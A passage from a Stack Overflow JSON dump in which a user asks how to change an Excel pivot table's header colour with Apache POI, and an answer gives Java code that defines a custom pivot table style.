(Map.Entry&lt;STTableStyleType.Enum, CTDxf&gt; entry : typeStyles.entrySet()) {\r\n        STTableStyleType.Enum type = entry.getKey();\r\n        CTDxf typeDxf = entry.getValue();\r\n        int dxfId = stylesTable.putDxf(typeDxf);\r\n        CTTableStyleElement tableStyleElement = tableStyle.addNewTableStyleElement();\r\n        tableStyleElement.setDxfId(dxfId-1);\r\n        tableStyleElement.setType(type);\r\n      }\r\n     }\r\n    ...\r\n\r\n____________________________\r\n\r\nComplete Example:\r\n\r\n\r\n    import org.apache.poi.xssf.usermodel.*;\r\n    import org.apache.poi.xssf.model.StylesTable;\r\n    \r\n    import org.apache.poi.ss.usermodel.DataConsolidateFunction;\r\n    import org.apache.poi.ss.usermodel.DataFormatter;\r\n    import org.apache.poi.ss.util.AreaReference;\r\n    import org.apache.poi.ss.util.CellReference;\r\n    import org.apache.poi.ss.SpreadsheetVersion;\r\n    \r\n    import java.io.FileOutputStream;\r\n    \r\n    import java.util.*;\r\n    \r\n    import org.openxmlformats.schemas.spreadsheetml.x2006.main.*;\r\n    \r\n    public class Testpivot8 {\r\n     public static void main(String[] args) throws Exception {\r\n      DataFormatter formatter = new DataFormatter(Locale.US);\r\n      XSSFWorkbook wb = new XSSFWorkbook();\r\n      XSSFCellStyle dateStyle = wb.createCellStyle();\r\n      dateStyle.setDataFormat(wb.createDataFormat().getFormat(&quot;mm/dd/yyyy&quot;));\r\n    \r\n      Object[][] data = new Object[][]{\r\n       {&quot;AAA&quot;,&quot;BBB&quot;,&quot;CCC&quot;,&quot;DDD&quot;,&quot;EEE&quot;,&quot;FFF&quot;,&quot;GGG&quot;,&quot;HHH&quot;}, \r\n       {&quot;TOM&quot;,&quot;DUMMY&quot;,&quot;VAL&quot;,1001683,&quot;Description1&quot;,new GregorianCalendar(2017, 3, 27),&quot;CAT&quot;,780936.58},\r\n       {&quot;TOM&quot;,&quot;DUMMY&quot;,&quot;VAL&quot;,1001695,&quot;Description2&quot;,new GregorianCalendar(2017, 3, 27),&quot;CAT&quot;,136.28},\r\n       {&quot;HARRY&quot;,&quot;DUMMY1&quot;,&quot;VAL1&quot;,1001692,&quot;Description3&quot;,new GregorianCalendar(2017, 4, 3),&quot;CAT1&quot;,191468.21},\r\n       {&quot;HARRY&quot;,&quot;DUMMY1&quot;,&quot;VAL1&quot;,1001698,&quot;Description4&quot;,new GregorianCalendar(2017, 4, 4),&quot;CAT1&quot;,10.11}\r\n      };\r\n    \r\n      XSSFSheet sheet = wb.createSheet(&quot;data&quot;);\r\n      for(Object[] dataRow : data) {\r\n       XSSFRow row = sheet.createRow(sheet.getPhysicalNumberOfRows());\r\n       for(Object dataCell : dataRow){\r\n        XSSFCell cell = row.createCell(row.getPhysicalNumberOfCells());\r\n        if (dataCell instanceof String) {\r\n         cell.setCellValue((String)dataCell);\r\n        } else if (dataCell instanceof Double) {\r\n         cell.setCellValue((Double)dataCell);\r\n        } else if (dataCell instanceof Integer) {\r\n         cell.setCellValue((Integer)dataCell);\r\n        } else if (dataCell instanceof GregorianCalendar) {\r\n         cell.setCellValue((GregorianCalendar)dataCell);\r\n         cell.setCellStyle(dateStyle);\r\n        }\r\n       }\r\n      }\r\n    \r\n      XSSFSheet pivot = wb.createSheet(&quot;summary&quot;);\r\n      int rowCount = data.length;\r\n      int colCount = data[0].length;\r\n      AreaReference areaReference = new AreaReference(new CellReference(&quot;A1&quot;), new CellReference(rowCount-1, colCount-1), SpreadsheetVersion.EXCEL2007);\r\n      XSSFPivotTable pivotTable =  pivot.createPivotTable(areaReference, new CellReference(&quot;A1&quot;), sheet);\r\n      pivotTable.getCTPivotTableDefinition().setRowHeaderCaption(&quot;AAA&quot;);\r\n    \r\n      List&lt;Integer&gt; iterList = new ArrayList&lt;Integer&gt;();\r\n      iterList.add(0);\r\n      iterList.add(1);\r\n      iterList.add(2);\r\n      iterList.add(3);\r\n      iterList.add(4);\r\n      iterList.add(5);\r\n      iterList.add(6);\r\n    \r\n      pivotTable.getCTPivotTableDefinition().setUpdatedVersion((short)6); \r\n    \r\n      for (Integer j : iterList) {\r\n       pivotTable.addRowLabel(j);\r\n       TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;(String.CASE_INSENSITIVE_ORDER);\r\n       for (int r = areaReference.getFirstCell().getRow()+1; r &lt; areaReference.getLastCell().getRow()+1; r++) {\r\n        uniqueItems.add(formatter.formatCellValue(sheet.getRow(r).getCell(j)));\r\n       }\r\n    \r\n       System.out.println(uniqueItems);\r\n    \r\n       CTPivotField ctPivotField = pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(j);\r\n       int i = 0;\r\n       for (String item : uniqueItems) {\r\n        ctPivotField.getItems().getItemArray(i).unsetT();\r\n        ctPivotField.getItems().getItemArray(i).setX((long)i);\r\n        pivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields()\r\n         .getCacheFieldArray(j).getSharedItems().addNewS().setV(item);\r\n        i++;\r\n       }\r\n       ctPivotField.setDefaultSubtotal(false);\r\n       ctPivotField.setOutline(false);\r\n    \r\n       if (ctPivotField.getDefaultSubtotal()) i++; \r\n       for (int k = ctPivotField.getItems().getItemList().size()-1; k &gt;= i; k--) {\r\n        ctPivotField.getItems().removeItem(k);\r\n       }\r\n       ctPivotField.getItems().setCount(i);\r\n    \r\n       CTExtensionList extList = ctPivotField.addNewExtLst();\r\n       String extXML = \r\n          &quot;&lt;ext uri=\\&quot;{2946ED86-A175-432a-8AC1-64E0C546D7DE}\\&quot;&quot;\r\n        + &quot; xmlns:x14=\\&quot;http://schemas.microsoft.com/office/spreadsheetml/2009/9/main\\&quot;&gt;&quot;\r\n        + &quot;&lt;x14:pivotField fillDownLabels=\\&quot;1\\&quot;/&gt;&quot;\r\n        + &quot;&lt;/ext&gt;&quot;;\r\n       org.apache.xmlbeans.XmlObject xlmObject = \r\n       org.apache.xmlbeans.XmlObject.Factory.parse(extXML);\r\n       extList.set(xlmObject);\r\n      }\r\n    \r\n      System.out.println(&quot;----end---&quot;);\r\n    \r\n      pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 7, &quot;SUM&quot;);\r\n    \r\n      // create a new custom pivot table style\r\n      // create dxf for each needed table style type\r\n      STTableStyleType.Enum headerRow = STTableStyleType.HEADER_ROW;\r\n      CTDxf headerRowDxf = createDxf(true, new byte[] {(byte)255, (byte)255, (byte)255}, new byte[] {(byte)4, (byte)123, (byte)91});\r\n      STTableStyleType.Enum totalRow = STTableStyleType.TOTAL_ROW;\r\n      CTDxf totalRowDxf = createDxf(true, new byte[] {(byte)255, (byte)255, (byte)255}, new byte[] {(byte)4, (byte)123, (byte)91});\r\n      STTableStyleType.Enum firstRowSubheading = STTableStyleType.FIRST_ROW_SUBHEADING;\r\n      CTDxf firstRowSubheadingDxf = createDxf(true, null, null);\r\n      STTableStyleType.Enum secondRowSubheading = STTableStyleType.SECOND_ROW_SUBHEADING;\r\n      CTDxf secondRowSubheadingDxf = createDxf(true, null, null);\r\n      // map table style types to dxf\r\n      Map&lt;STTableStyleType.Enum, CTDxf&gt; typeStyles = new HashMap&lt;STTableStyleType.Enum, CTDxf&gt;();\r\n      typeStyles.put(headerRow, headerRowDxf);\r\n      typeStyles.put(totalRow, totalRowDxf);\r\n      typeStyles.put(firstRowSubheading, firstRowSubheadingDxf);\r\n      typeStyles.put(secondRowSubheading, secondRowSubheadingDxf);\r\n      // \r\n      createPivotTableStyle(wb.getStylesSource(), &quot;CustomPivotStyle1&quot;, typeStyles);\r\n      pivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(&quot;CustomPivotStyle1&quot;);\r\n    \r\n      sheet.setSelected(false);\r\n      wb.setActiveSheet(wb.getSheetIndex(pivot));\r\n     \r\n      FileOutputStream fileOut = new FileOutputStream(&quot;newoutputfile.xlsx&quot;);\r\n      wb.write(fileOut);\r\n      fileOut.close();\r\n      wb.close();\r\n     }\r\n    \r\n     static CTDxf createDxf(boolean fontBold, byte[] fontRGB, byte[] fillRGB) {\r\n      CTDxf dxf = CTDxf.Factory.newInstance();\r\n      CTFont font = dxf.addNewFont();\r\n      if (fontBold) font.addNewB();\r\n      if (fontRGB != null) font.addNewColor().setRgb(fontRGB);\r\n      if (fillRGB != null) {\r\n       CTFill fill = dxf.addNewFill();\r\n       fill.addNewPatternFill().addNewBgColor().setRgb(fillRGB);\r\n      }\r\n      return dxf;\r\n     }\r\n    \r\n     static void createPivotTableStyle(StylesTable stylesTable, String styleName, Map&lt;STTableStyleType.Enum, CTDxf&gt; typeStyles) {\r\n    \r\n      // get or create table styles\r\n      CTTableStyles tableStyles = stylesTable.getCTStylesheet().getTableStyles();\r\n      if (tableStyles == null) tableStyles = stylesTable.getCTStylesheet().addNewTableStyles();\r\n    \r\n      // add table style named as styleName\r\n      CTTableStyle tableStyle = tableStyles.addNewTableStyle();\r\n      tableStyle.setName(styleName);\r\n    \r\n      // set TableStyleType styles: TableStyleType -&gt; dxf\r\n      for (Map.Entry&lt;STTableStyleType.Enum, CTDxf&gt; entry : typeStyles.entrySet()) {\r\n        STTableStyleType.Enum type = entry.getKey();\r\n        CTDxf typeDxf = entry.getValue();\r\n        int dxfId = stylesTable.putDxf(typeDxf);\r\n        CTTableStyleElement tableStyleElement = tableStyle.addNewTableStyleElement();\r\n        tableStyleElement.setDxfId(dxfId-1);\r\n        tableStyleElement.setType(type);\r\n      }\r\n     }\r\n    }","title":"How to Change the Default Header Background color in PIVOT Table","body":"<p>In <code>Excel</code> pivot tables are styled using special named pivot table styles. The names of possible named styles can be got from <code>Excel</code>'s <code>GUI</code> in <code>PivotTable Tools</code> tab - <code>Design</code>. To set a style use:</p>\n<pre><code>pivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(&quot;PivotStyleDark7&quot;);\n</code></pre>\n<p>where <code>PivotStyleDark7</code> is the name of the named style.</p>\n<p>If none of the default styles fulfill the requirements, then new named styles must be created. In <code>Excel</code>'s <code>GUI</code> this is possible by creating a new pivot table style and format some of the given table style types, for example: header row, totals row, ...</p>\n<p>If that shall be done using <code>apache poi</code>, then in <a href=\"https://poi.apache.org/apidocs/dev/org/apache/poi/xssf/model/StylesTable.html\" rel=\"nofollow noreferrer\">StylesTable</a> a new table style must be created. There for each table style type a table style element must point to a predefined <code>dxf</code> having the format.</p>\n<pre><code>...\n  // create a new custom pivot table style\n  // create dxf for each needed table style type\n  STTableStyleType.Enum headerRow = STTableStyleType.HEADER_ROW;\n  CTDxf headerRowDxf = createDxf(true, new byte[] {(byte)255, (byte)255, (byte)255}, new byte[] {(byte)0, (byte)80, (byte)0});\n  STTableStyleType.Enum totalRow = STTableStyleType.TOTAL_ROW;\n  CTDxf totalRowDxf = createDxf(true, new byte[] {(byte)255, (byte)255, (byte)255}, new byte[] {(byte)0, (byte)80, (byte)0});\n  STTableStyleType.Enum firstRowSubheading = STTableStyleType.FIRST_ROW_SUBHEADING;\n  CTDxf firstRowSubheadingDxf = createDxf(true, null, null);\n  STTableStyleType.Enum secondRowSubheading = STTableStyleType.SECOND_ROW_SUBHEADING;\n  CTDxf secondRowSubheadingDxf = createDxf(true, null, null);\n  // map table style types to dxf\n  Map&lt;STTableStyleType.Enum, CTDxf&gt; typeStyles = new HashMap&lt;STTableStyleType.Enum, CTDxf&gt;();\n  typeStyles.put(headerRow, headerRowDxf);\n  typeStyles.put(totalRow, totalRowDxf);\n  typeStyles.put(firstRowSubheading, firstRowSubheadingDxf);\n  typeStyles.put(secondRowSubheading, secondRowSubheadingDxf);\n  // \n  createPivotTableStyle(((XSSFWorkbook)wb).getStylesSource(), &quot;CustomPivotStyle1&quot;, typeStyles);\n  pivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(&quot;CustomPivotStyle1&quot;);\n...\n</code></pre>\n<hr />\n<pre><code>...\n static CTDxf createDxf(boolean fontBold, byte[] fontRGB, byte[] fillRGB) {\n  CTDxf dxf = CTDxf.Factory.newInstance();\n  CTFont font = dxf.addNewFont();\n  if (fontBold) font.addNewB();\n  if (fontRGB != null) font.addNewColor().setRgb(fontRGB);\n  if (fillRGB != null) {\n   CTFill fill = dxf.addNewFill();\n   fill.addNewPatternFill().addNewBgColor().setRgb(fillRGB);\n  }\n  return dxf;\n }\n\n static void createPivotTableStyle(StylesTable stylesTable, String styleName, Map&lt;STTableStyleType.Enum, CTDxf&gt; typeStyles) {\n\n  // get or create table styles\n  CTTableStyles tableStyles = stylesTable.getCTStylesheet().getTableStyles();\n  if (tableStyles == null) tableStyles = stylesTable.getCTStylesheet().addNewTableStyles();\n\n  // add table style named as styleName\n  CTTableStyle tableStyle = tableStyles.addNewTableStyle();\n  tableStyle.setName(styleName);\n\n  // set TableStyleType styles: TableStyleType -&gt; dxf\n  for (Map.Entry&lt;STTableStyleType.Enum, CTDxf&gt; entry : typeStyles.entrySet()) {\n    STTableStyleType.Enum type = entry.getKey();\n    CTDxf typeDxf = entry.getValue();\n    int dxfId = stylesTable.putDxf(typeDxf);\n    CTTableStyleElement tableStyleElement = tableStyle.addNewTableStyleElement();\n    tableStyleElement.setDxfId(dxfId-1);\n    tableStyleElement.setType(type);\n  }\n }\n...\n</code></pre>\n<hr />\n<p>Complete Example:</p>\n<pre><code>import org.apache.poi.xssf.usermodel.*;\nimport org.apache.poi.xssf.model.StylesTable;\n\nimport org.apache.poi.ss.usermodel.DataConsolidateFunction;\nimport org.apache.poi.ss.usermodel.DataFormatter;\nimport org.apache.poi.ss.util.AreaReference;\nimport org.apache.poi.ss.util.CellReference;\nimport org.apache.poi.ss.SpreadsheetVersion;\n\nimport java.io.FileOutputStream;\n\nimport java.util.*;\n\nimport org.openxmlformats.schemas.spreadsheetml.x2006.main.*;\n\npublic class Testpivot8 {\n public static void main(String[] args) throws Exception {\n  DataFormatter formatter = new DataFormatter(Locale.US);\n  XSSFWorkbook wb = new XSSFWorkbook();\n  XSSFCellStyle dateStyle = wb.createCellStyle();\n  dateStyle.setDataFormat(wb.createDataFormat().getFormat(&quot;mm/dd/yyyy&quot;));\n\n  Object[][] data = new Object[][]{\n   {&quot;AAA&quot;,&quot;BBB&quot;,&quot;CCC&quot;,&quot;DDD&quot;,&quot;EEE&quot;,&quot;FFF&quot;,&quot;GGG&quot;,&quot;HHH&quot;}, \n   {&quot;TOM&quot;,&quot;DUMMY&quot;,&quot;VAL&quot;,1001683,&quot;Description1&quot;,new GregorianCalendar(2017, 3, 27),&quot;CAT&quot;,780936.58},\n   {&quot;TOM&quot;,&quot;DUMMY&quot;,&quot;VAL&quot;,1001695,&quot;Description2&quot;,new GregorianCalendar(2017, 3, 27),&quot;CAT&quot;,136.28},\n   {&quot;HARRY&quot;,&quot;DUMMY1&quot;,&quot;VAL1&quot;,1001692,&quot;Description3&quot;,new GregorianCalendar(2017, 4, 3),&quot;CAT1&quot;,191468.21},\n   {&quot;HARRY&quot;,&quot;DUMMY1&quot;,&quot;VAL1&quot;,1001698,&quot;Description4&quot;,new GregorianCalendar(2017, 4, 4),&quot;CAT1&quot;,10.11}\n  };\n\n  XSSFSheet sheet = wb.createSheet(&quot;data&quot;);\n  for(Object[] dataRow : data) {\n   XSSFRow row = sheet.createRow(sheet.getPhysicalNumberOfRows());\n   for(Object dataCell : dataRow){\n    XSSFCell cell = row.createCell(row.getPhysicalNumberOfCells());\n    if (dataCell instanceof String) {\n     cell.setCellValue((String)dataCell);\n    } else if (dataCell instanceof Double) {\n     cell.setCellValue((Double)dataCell);\n    } else if (dataCell instanceof Integer) {\n     cell.setCellValue((Integer)dataCell);\n    } else if (dataCell instanceof GregorianCalendar) {\n     cell.setCellValue((GregorianCalendar)dataCell);\n     cell.setCellStyle(dateStyle);\n    }\n   }\n  }\n\n  XSSFSheet pivot = wb.createSheet(&quot;summary&quot;);\n  int rowCount = data.length;\n  int colCount = data[0].length;\n  AreaReference areaReference = new AreaReference(new CellReference(&quot;A1&quot;), new CellReference(rowCount-1, colCount-1), SpreadsheetVersion.EXCEL2007);\n  XSSFPivotTable pivotTable =  pivot.createPivotTable(areaReference, new CellReference(&quot;A1&quot;), sheet);\n  pivotTable.getCTPivotTableDefinition().setRowHeaderCaption(&quot;AAA&quot;);\n\n  List&lt;Integer&gt; iterList = new ArrayList&lt;Integer&gt;();\n  iterList.add(0);\n  iterList.add(1);\n  iterList.add(2);\n  iterList.add(3);\n  iterList.add(4);\n  iterList.add(5);\n  iterList.add(6);\n\n  pivotTable.getCTPivotTableDefinition().setUpdatedVersion((short)6); \n\n  for (Integer j : iterList) {\n   pivotTable.addRowLabel(j);\n   TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;(String.CASE_INSENSITIVE_ORDER);\n   for (int r = areaReference.getFirstCell().getRow()+1; r &lt; areaReference.getLastCell().getRow()+1; r++) {\n    uniqueItems.add(formatter.formatCellValue(sheet.getRow(r).getCell(j)));\n   }\n\n   System.out.println(uniqueItems);\n\n   CTPivotField ctPivotField = pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(j);\n   int i = 0;\n   for (String item : uniqueItems) {\n    ctPivotField.getItems().getItemArray(i).unsetT();\n    ctPivotField.getItems().getItemArray(i).setX((long)i);\n    pivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields()\n     .getCacheFieldArray(j).getSharedItems().addNewS().setV(item);\n    i++;\n   }\n   ctPivotField.setDefaultSubtotal(false);\n   ctPivotField.setOutline(false);\n\n   if (ctPivotField.getDefaultSubtotal()) i++; \n   for (int k = ctPivotField.getItems().getItemList().size()-1; k &gt;= i; k--) {\n    ctPivotField.getItems().removeItem(k);\n   }\n   ctPivotField.getItems().setCount(i);\n\n   CTExtensionList extList = ctPivotField.addNewExtLst();\n   String extXML = \n      &quot;&lt;ext uri=\\&quot;{2946ED86-A175-432a-8AC1-64E0C546D7DE}\\&quot;&quot;\n    + &quot; xmlns:x14=\\&quot;http://schemas.microsoft.com/office/spreadsheetml/2009/9/main\\&quot;&gt;&quot;\n    + &quot;&lt;x14:pivotField fillDownLabels=\\&quot;1\\&quot;/&gt;&quot;\n    + &quot;&lt;/ext&gt;&quot;;\n   org.apache.xmlbeans.XmlObject xlmObject = \n   org.apache.xmlbeans.XmlObject.Factory.parse(extXML);\n   extList.set(xlmObject);\n  }\n\n  System.out.println(&quot;----end---&quot;);\n\n  pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 7, &quot;SUM&quot;);\n\n  // create a new custom pivot table style\n  // create dxf for each needed table style type\n  STTableStyleType.Enum headerRow = STTableStyleType.HEADER_ROW;\n  CTDxf headerRowDxf = createDxf(true, new byte[] {(byte)255, (byte)255, (byte)255}, new byte[] {(byte)4, (byte)123, (byte)91});\n  STTableStyleType.Enum totalRow = STTableStyleType.TOTAL_ROW;\n  CTDxf totalRowDxf = createDxf(true, new byte[] {(byte)255, (byte)255, (byte)255}, new byte[] {(byte)4, (byte)123, (byte)91});\n  STTableStyleType.Enum firstRowSubheading = STTableStyleType.FIRST_ROW_SUBHEADING;\n  CTDxf firstRowSubheadingDxf = createDxf(true, null, null);\n  STTableStyleType.Enum secondRowSubheading = STTableStyleType.SECOND_ROW_SUBHEADING;\n  CTDxf secondRowSubheadingDxf = createDxf(true, null, null);\n  // map table style types to dxf\n  Map&lt;STTableStyleType.Enum, CTDxf&gt; typeStyles = new HashMap&lt;STTableStyleType.Enum, CTDxf&gt;();\n  typeStyles.put(headerRow, headerRowDxf);\n  typeStyles.put(totalRow, totalRowDxf);\n  typeStyles.put(firstRowSubheading, firstRowSubheadingDxf);\n  typeStyles.put(secondRowSubheading, secondRowSubheadingDxf);\n  // \n  createPivotTableStyle(wb.getStylesSource(), &quot;CustomPivotStyle1&quot;, typeStyles);\n  pivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(&quot;CustomPivotStyle1&quot;);\n\n  sheet.setSelected(false);\n  wb.setActiveSheet(wb.getSheetIndex(pivot));\n \n  FileOutputStream fileOut = new FileOutputStream(&quot;newoutputfile.xlsx&quot;);\n  wb.write(fileOut);\n  fileOut.close();\n  wb.close();\n }\n\n static CTDxf createDxf(boolean fontBold, byte[] fontRGB, byte[] fillRGB) {\n  CTDxf dxf = CTDxf.Factory.newInstance();\n  CTFont font = dxf.addNewFont();\n  if (fontBold) font.addNewB();\n  if (fontRGB != null) font.addNewColor().setRgb(fontRGB);\n  if (fillRGB != null) {\n   CTFill fill = dxf.addNewFill();\n   fill.addNewPatternFill().addNewBgColor().setRgb(fillRGB);\n  }\n  return dxf;\n }\n\n static void createPivotTableStyle(StylesTable stylesTable, String styleName, Map&lt;STTableStyleType.Enum, CTDxf&gt; typeStyles) {\n\n  // get or create table styles\n  CTTableStyles tableStyles = stylesTable.getCTStylesheet().getTableStyles();\n  if (tableStyles == null) tableStyles = stylesTable.getCTStylesheet().addNewTableStyles();\n\n  // add table style named as styleName\n  CTTableStyle tableStyle = tableStyles.addNewTableStyle();\n  tableStyle.setName(styleName);\n\n  // set TableStyleType styles: TableStyleType -&gt; dxf\n  for (Map.Entry&lt;STTableStyleType.Enum, CTDxf&gt; entry : typeStyles.entrySet()) {\n    STTableStyleType.Enum type = entry.getKey();\n    CTDxf typeDxf = entry.getValue();\n    int dxfId = stylesTable.putDxf(typeDxf);\n    CTTableStyleElement tableStyleElement = tableStyle.addNewTableStyleElement();\n    tableStyleElement.setDxfId(dxfId-1);\n    tableStyleElement.setType(type);\n  }\n }\n}\n</code></pre>\n"}],"owner":{"account_id":17089866,"reputation":55,"user_id":12366270,"display_name":"Vijay"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1164,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"accepted_answer_id":59085731,"answer_count":2,"score":1,"last_activity_date":1640268491,"creation_date":1574857472,"question_id":59070187,"body_markdown":"How to Change the Default Header Background color in PIVOT Table, currently its coming blue. Currently i am changing the background color from Blue to Green. But facing difficulty in achieve it. \r\n\r\nI am used  below syntax by setting various pivot style in setName, but not find the exact colour of green. I need little more darker green which shown in expected output(which is lighter green). Please let me know how can i achieve it.\r\n\r\npivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(&quot;&quot;);\r\n\r\nOutput which i am getting:\r\n\r\n[![enter image description here][1]][1]\r\n\r\nBelow is the Output which i Want but green color should be little more darker than below (Please refer below Test Color Tab):\r\n\r\n[![enter image description here][2]][2]\r\n\r\nGreen color combination which i want.\r\n\r\n[![enter image description here][3]][3]\r\n\r\nBelow is the code:\r\n\r\n    package com.test.pivottables;\r\n    import org.apache.poi.xssf.usermodel.*;\r\n    import org.apache.poi.ss.usermodel.*;\r\n    import org.apache.poi.ss.util.*;\r\n    import org.apache.poi.ss.*;\r\n    import java.io.*;\r\n    import java.util.ArrayList;\r\n    import java.util.TreeSet;\r\n    import java.util.List;\r\n    import org.openxmlformats.schemas.spreadsheetml.x2006.main.*;\r\n\r\n    public class Testpivot8{\r\n     public static void main(String[] args) throws Exception {\r\n      Workbook wb = new XSSFWorkbook();\r\n      Object[][] data = new Object[][]{\r\n     {&quot;AAA&quot;,&quot;BBB&quot;,&quot;CCC&quot;,&quot;DDD&quot;,&quot;EEE&quot;,&quot;FFF&quot;,&quot;GGG&quot;,&quot;HHH&quot;}, \r\n      {&quot;TOM&quot;,&quot;DUMMY&quot;,&quot;VAL&quot;,&quot;1001683&quot;,&quot;Description1&quot;,&quot;27/04/2017&quot;,&quot;CAT&quot;,780936.58},\r\n     {&quot;TOM&quot;,&quot;DUMMY&quot;,&quot;VAL&quot;,&quot;1001695&quot;,&quot;Description2&quot;,&quot;27/04/2017&quot;,&quot;CAT&quot;,136.28},\r\n     {&quot;HARRY&quot;,&quot;DUMMY1&quot;,&quot;VAL1&quot;,&quot;1001692&quot;,&quot;Description3&quot;,&quot;03/05/2017&quot;,&quot;CAT1&quot;,191468.21},\r\n     {&quot;HARRY&quot;,&quot;DUMMY1&quot;,&quot;VAL1&quot;,&quot;1001698&quot;,&quot;Description4&quot;,&quot;04/05/2017&quot;,&quot;CAT1&quot;,10.11}\r\n      };\r\n\r\n    XSSFSheet sheet = (XSSFSheet) wb.createSheet(&quot;data&quot;);\r\n    XSSFSheet pivot = (XSSFSheet) wb.createSheet(&quot;summary&quot;);\r\n    for(Object[] dataRow : data){\r\n     XSSFRow row = sheet.createRow(sheet.getPhysicalNumberOfRows());\r\n     for(Object dataCell : dataRow){\r\n     XSSFCell cell = row.createCell(row.getPhysicalNumberOfCells());\r\n    if (dataCell instanceof String) {\r\n     cell.setCellValue((String)dataCell);\r\n    } else if (dataCell instanceof Double) {\r\n     cell.setCellValue((Double)dataCell);\r\n    }\r\n     }\r\n    }\r\n\r\n      AreaReference areaReference = new AreaReference(&quot;A1:H&quot;+ (sheet.getLastRowNum() + 1), \r\n        SpreadsheetVersion.EXCEL2007);\r\n      XSSFPivotTable pivotTable =  pivot.createPivotTable(areaReference, new CellReference(&quot;A1&quot;), \r\n      sheet);\r\n     pivotTable.getCTPivotTableDefinition().setRowHeaderCaption(&quot;AAA&quot;);\r\n\r\n    List&lt;Integer&gt; iterList = new ArrayList&lt;Integer&gt;();\r\n    iterList.add(0);\r\n    iterList.add(1);\r\n     iterList.add(2);\r\n    iterList.add(3);\r\n    iterList.add(4);\r\n     iterList.add(5);\r\n     iterList.add(6);\r\n\r\n  \r\n    pivotTable.getCTPivotTableDefinition().setUpdatedVersion((short)6); \r\n\r\n     for (Integer j : iterList) {\r\n\r\n\r\n       pivotTable.addRowLabel(j);\r\n       TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;();\r\n       for (int r = areaReference.getFirstCell().getRow()+1; r &lt; \r\n       areaReference.getLastCell().getRow()+1; r++) {\r\n       uniqueItems.add(sheet.getRow(r).getCell(j).getStringCellValue());\r\n      }\r\n      System.out.println(uniqueItems);\r\n      CTPivotField ctPivotField = \r\n      pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(j);\r\n     int i = 0;\r\n       for (String item : uniqueItems) {\r\n        ctPivotField.getItems().getItemArray(i).unsetT();\r\n       ctPivotField.getItems().getItemArray(i).setX((long)i);\r\n        pivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields()\r\n      .getCacheFieldArray(j)\r\n       .getSharedItems().addNewS().setV(item);\r\n        i++;\r\n       }\r\n            ctPivotField.setDefaultSubtotal(false);\r\n \r\n   \r\n             ctPivotField.setOutline(false);\r\n\r\n   \r\n        if (ctPivotField.getDefaultSubtotal()) i++; \r\n             for (int k = ctPivotField.getItems().getItemList().size()-1; k &gt;= i; k--) {\r\n             ctPivotField.getItems().removeItem(k);\r\n            }\r\n           ctPivotField.getItems().setCount(i);\r\n\r\n  \r\n               CTExtensionList extList = ctPivotField.addNewExtLst();\r\n            String extXML = \r\n           &quot;&lt;ext uri=\\&quot;{2946ED86-A175-432a-8AC1-64E0C546D7DE}\\&quot;&quot;\r\n           + &quot; xmlns:x14=\\&quot;http://schemas.microsoft.com/office/spreadsheetml/2009/9/main\\&quot;&gt;&quot;\r\n        + &quot;&lt;x14:pivotField fillDownLabels=\\&quot;1\\&quot;/&gt;&quot;\r\n         + &quot;&lt;/ext&gt;&quot;;\r\n            org.apache.xmlbeans.XmlObject xlmObject = \r\n         org.apache.xmlbeans.XmlObject.Factory.parse(extXML);\r\n              extList.set(xlmObject);\r\n\r\n         }\r\n\r\n            System.out.println(&quot;----end---&quot;);\r\n\r\n           pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 7, &quot;SUM&quot;);\r\n\r\n          FileOutputStream fileOut = new FileOutputStream(&quot;newoutputfile.xlsx&quot;);\r\n             wb.write(fileOut);\r\n               fileOut.close();\r\n              wb.close();\r\n              }\r\n        }\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/dsN1E.png\r\n  [2]: https://i.stack.imgur.com/YXWWd.png\r\n  [3]: https://i.stack.imgur.com/KB1oe.png","title":"How to Change the Default Header Background color in PIVOT Table","body":"<p>How to Change the Default Header Background color in PIVOT Table, currently its coming blue. Currently i am changing the background color from Blue to Green. But facing difficulty in achieve it. </p>\n\n<p>I am used  below syntax by setting various pivot style in setName, but not find the exact colour of green. I need little more darker green which shown in expected output(which is lighter green). Please let me know how can i achieve it.</p>\n\n<p>pivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(\"\");</p>\n\n<p>Output which i am getting:</p>\n\n<p><a href=\"https://i.stack.imgur.com/dsN1E.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/dsN1E.png\" alt=\"enter image description here\"></a></p>\n\n<p>Below is the Output which i Want but green color should be little more darker than below (Please refer below Test Color Tab):</p>\n\n<p><a href=\"https://i.stack.imgur.com/YXWWd.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/YXWWd.png\" alt=\"enter image description here\"></a></p>\n\n<p>Green color combination which i want.</p>\n\n<p><a href=\"https://i.stack.imgur.com/KB1oe.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/KB1oe.png\" alt=\"enter image description here\"></a></p>\n\n<p>Below is the code:</p>\n\n<pre><code>package com.test.pivottables;\nimport org.apache.poi.xssf.usermodel.*;\nimport org.apache.poi.ss.usermodel.*;\nimport org.apache.poi.ss.util.*;\nimport org.apache.poi.ss.*;\nimport java.io.*;\nimport java.util.ArrayList;\nimport java.util.TreeSet;\nimport java.util.List;\nimport org.openxmlformats.schemas.spreadsheetml.x2006.main.*;\n\npublic class Testpivot8{\n public static void main(String[] args) throws Exception {\n  Workbook wb = new XSSFWorkbook();\n  Object[][] data = new Object[][]{\n 